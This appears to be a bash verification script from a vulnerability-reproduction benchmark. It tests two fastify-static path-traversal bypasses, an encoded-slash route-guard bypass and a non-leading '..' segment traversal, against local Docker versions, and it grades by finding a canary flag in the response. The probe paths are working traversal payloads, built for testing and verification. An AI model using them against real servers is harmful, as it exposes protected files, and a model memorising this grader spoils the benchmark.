#!/usr/bin/env bash
# verify.sh --seed|--residual — fastify-static CVE-2026-6414 -> CVE-2026-15074
# 效果通道：HTTP 响应 body（/data/root/secret/canary.txt 内容 = PCB_FLAG）。
#   --seed     : %2F 编码分隔符绕过守卫路由 /static/secret/*（CVE-2026-6414）
#                v0(9.1.0) 生效(200) / v1(10.1.0) 已修复(404)
#   --residual : 非前导 '..' 段绕过（CVE-2026-15074，find-my-way 不归一化 '..'，
#                @fastify/send 随后 path.normalize 折叠）
#                v1(10.1.0) 生效(200) / v2(10.1.1) 已修复(403)
# 退出码：0=效果发生(RUN_FLAG_REF 出现在响应 body) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: verify.sh --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# host 端口：优先 docker compose port 动态解析，回退 case 固定映射
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-3000}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=55100 ;; v1) PORT=55101 ;; v2) PORT=55102 ;;
  esac
fi
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"

# 就绪探测：HTTP 有响应即就绪（含 404/403），最多 ~60s
ready=0
for _ in $(seq 1 30); do
  if "$PY" - "$PORT" <<'PY' >/dev/null 2>&1
import sys, urllib.request
try:
    with urllib.request.urlopen(f"http://127.0.0.1:{sys.argv[1]}/", timeout=3) as r:
        r.read()
    sys.exit(0)
except urllib.error.HTTPError:
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  then ready=1; break; fi
  sleep 2
done
[[ "$ready" == 1 ]] || { echo "target not ready on 127.0.0.1:$PORT" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  PROBE_PATH="/static/secret%2Fcanary.txt"
else
  PROBE_PATH="/static/foo/../secret/canary.txt"
fi

# 探测脚本（临时文件，避免 heredoc 嵌套）：GET 目标路径，body 即效果通道
cat > "$WORK_DIR/probe_ffs.py" <<'PY'
import sys, json
sys.path.insert(0, sys.argv[1])
from original_poc import candidate
r = candidate(base=f"http://127.0.0.1:{sys.argv[2]}", path=sys.argv[3])
print(json.dumps(r, default=str))
PY
OUT="$("$PY" "$WORK_DIR/probe_ffs.py" "$CASE_DIR/poc" "$PORT" "$PROBE_PATH" 2>&1)"
rc=$?
if [[ "$rc" -ne 0 ]]; then echo "probe execution failed: $OUT" >&2; exit 20; fi

BODY="$(printf '%s' "$OUT" | "$PY" -c 'import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get("body") or "")
except Exception:
    print("")')"
REF="$RUN_FLAG"
echo "[verify] mode=$MODE version=$VERSION port=$PORT probe=$PROBE_PATH resp=$(printf '%s' "$OUT" | head -c 200)"
if grep -qF -- "$REF" <<<"$BODY"; then
  echo "[verify] EFFECT: $REF observed in response body"
  exit 0
fi
echo "[verify] NO EFFECT: $REF not observed"
exit 10
